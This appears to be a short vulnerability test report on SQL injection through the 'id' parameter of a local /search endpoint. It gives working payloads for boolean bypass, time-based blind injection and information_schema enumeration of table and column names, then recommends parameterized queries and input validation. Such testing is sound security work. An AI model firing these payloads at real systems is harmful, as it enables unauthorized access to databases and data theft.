# Vulnerability Test: SQL Injection via GET Parameter

## Target
**Endpoint:** `/search?id=1`  
**Method:** GET  
**Tool:** HTTPie / Python Script

---

## Purpose
To test whether the `id` GET parameter is vulnerable to SQL injection and, if so, whether it allows:
- Error-based SQLi
- Blind SQLi
- Extraction of database schema and data via `information_schema`

---

## Test Setup
**Request Example:**
```bash
http GET http://localhost:5000/search?id=1
```

**Vulnerable Parameter:** `id`  
**Payload Examples:**
- `1 OR 1=1` (Authentication bypass)
- `1' AND SLEEP(5)--+` (Blind SQLi via time delay)
- `1' AND (SELECT COUNT(*) FROM information_schema.tables)--+` (Info schema enumeration)

---

## Request/Response Log

**Injected Request:**
```bash
http GET http://localhost:5000/search?id=' OR 1=1--+
```

**Expected Response:**
- `200 OK`
- If vulnerable: may return more results or user info that shouldn't be shown.
- If time-based: delay in response indicates successful blind injection.

---

## Exploitation Explanation

### Why this works:
If the `id` parameter is used unsafely in SQL queries without sanitization (e.g., via f-strings or string concatenation), attackers can manipulate it to execute arbitrary SQL.

### Security Impact:
- Possible unauthorized access to records
- Exposure of schema and sensitive data
- Lateral movement to other vulnerabilities

---

## Further Exploitation
1. Use `information_schema.tables` to enumerate table names:
```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--+
```

2. Extract column names:
```sql
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)--+
```

---

## Recommendations
- Use prepared statements or parameterized queries.
- Filter and validate all user input.
- Employ WAF and logging to detect suspicious activity.